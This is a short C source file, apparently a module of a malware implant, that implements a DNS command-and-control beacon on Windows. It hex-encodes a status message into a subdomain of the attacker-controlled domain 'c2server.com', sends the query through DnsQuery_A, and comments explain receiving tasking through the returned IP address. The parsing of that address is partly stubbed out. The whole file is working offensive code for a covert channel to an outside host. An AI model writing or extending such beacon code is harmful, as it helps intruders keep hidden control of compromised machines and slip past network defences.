// dns_beacon.c – Beacon DNS
#include <windows.h>
#include <windns.h>
#include <stdio.h>
#include "../../utils/logger.h"

// Link with Dnsapi.lib
#pragma comment(lib, "Dnsapi.lib")

// The domain we control
static const char* C2_DOMAIN = "c2server.com";

void DNS_Beacon() {
    // 1. Encode data into subdomain
    // Ex: "alive" -> hex/base64 -> "616c697665.c2server.com"
    char subdomain[256];
    sprintf(subdomain, "616c697665.%s", C2_DOMAIN); // "alive" in hex

    PDNS_RECORD pDnsRecord;
    DNS_STATUS status;

    // 2. Perform DNS Query (A Record or TXT)
    status = DnsQuery_A(subdomain, 
                        DNS_TYPE_A, 
                        DNS_QUERY_STANDARD, 
                        NULL, 
                        &pDnsRecord, 
                        NULL);

    if (status == ERROR_SUCCESS) {
        // 3. Receive command from IP address
        // Ex: 127.0.0.1 -> Keep alive, 127.0.0.2 -> Task...
        if (pDnsRecord) {
            // Check IP address returned
            // IN_ADDR ipAddr;
            // ipAddr.S_un.S_addr = pDnsRecord->Data.A.IpAddress;
             Log("DNS: Beacon successful, received response");
            DnsRecordListFree(pDnsRecord, DnsFreeRecordList);
        }
    } else {
         Log("DNS: Query failed");
    }
}
